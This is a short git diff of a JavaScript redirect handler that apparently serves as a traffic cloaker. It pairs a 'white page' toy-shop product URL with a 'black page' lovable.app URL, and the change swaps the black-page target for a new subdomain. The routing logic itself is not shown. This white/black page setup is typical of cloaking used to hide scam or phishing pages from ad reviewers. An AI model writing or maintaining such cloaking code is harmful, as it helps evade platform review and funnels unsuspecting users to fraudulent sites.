@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://toyscentral.dk/products/neca-coraline-prop-replica-10-coraline-doll";
-    const blackPageURL = "https://nowherehe.lovable.app/";
+    const blackPageURL = "https://csshhhggot.lovable.app/";
 
     //testing
   
@@ -27,5 +27,6 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
